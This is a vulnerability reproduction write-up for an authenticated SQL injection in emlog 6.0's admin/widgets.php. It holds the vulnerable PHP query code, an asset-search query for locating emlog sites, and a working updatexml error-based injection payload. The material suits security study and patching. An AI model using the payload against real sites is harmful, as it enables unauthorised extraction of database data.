# emlog widgets.php background SQL injection vulnerability

## Vulnerability Description

After logging in, emlog widgets.php file causes SQL injection by constructing special statements to obtain database sensitive information.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">emlog 6.0 </span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="EMLOG"</span>

## Vulnerability reappears

Product Home Page

```python
https://github.com/emlog/emlog
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634002177714-22159b01-c44f-476a-bb4f-8363cceb9460.png)

The vulnerable file is `admin/widgets.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634002231213-67b50259-52f0-4cf0-983b-fc1a88cc6471.png)

```python
if ($action == 'compages') {
    $wgNum = isset($_POST['wgnum']) ? intval($_POST['wgnum']) : 1;//侧边栏编号 1、2、3 ……
    $widgets = isset($_POST['widgets']) ? serialize($_POST['widgets']) : '';
    Option::updateOption("widgets{$wgNum}", $widgets);
    $CACHE->updateCache('options');
    emDirect("./widgets.php?activated=true&wg=$wgNum");
}
```

Pass parameters to wgnum and widgets, tracking method `updateOption`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634002837216-c1000372-81ea-4671-bc5d-c378110d93db.png)

```python
static function updateOption($name, $value, $isSyntax = false){
        $DB = Database::getInstance();
        $value = $isSyntax ? $value : "'$value'";
        $DB->query('UPDATE '.DB_PREFIX."options SET option_value=$value where option_name='$name'");
    }
```

It can be found that the incoming parameters are not filtered and the Payload is constructed.

```python
POST /admin/widgets.php?action=compages

widgets=1' and updatexml(0x3a,concat(1,(select user())),1)-- 
```

After debugging, you can find that the database error statement will be echoed to the page, and the error injection can obtain sensitive information.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634002917512-820b18c8-d37a-4507-974c-1ba9c2afc2ed.png)![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634003089227-452c8b4e-d367-4f01-af1f-e90a79bfd91f.png)